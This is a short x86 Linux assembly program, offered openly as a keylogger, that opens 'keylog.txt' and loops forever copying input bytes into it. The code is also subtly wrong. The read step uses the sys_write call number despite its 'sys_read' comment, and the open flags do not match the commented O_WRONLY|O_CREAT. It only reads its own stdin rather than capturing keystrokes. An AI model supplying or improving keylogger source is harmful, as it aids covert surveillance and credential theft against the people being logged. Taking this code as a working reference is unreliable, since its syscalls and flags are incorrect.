section .data
    log_file db 'keylog.txt', 0

section .bss
    file_handle resd 1

section .text
    global _start

_start:
    ; Open the log file
    mov eax, 5          ; sys_open
    mov ebx, log_file   ; filename
    mov ecx, 1000o      ; flags (O_WRONLY | O_CREAT)
    mov edx, 0666o      ; permissions
    int 0x80
    mov [file_handle], eax

    ; Infinite loop to log keys
loop_start:
    ; Read key press
    mov eax, 4          ; sys_read
    mov ebx, 0          ; stdin
    lea ecx, [key]      ; buffer
    mov edx, 1          ; size
    int 0x80

    ; Write key to file
    mov eax, 4          ; sys_write
    mov ebx, [file_handle]
    lea ecx, [key]
    mov edx, 1
    int 0x80

    jmp loop_start

section .bss
    key resb 1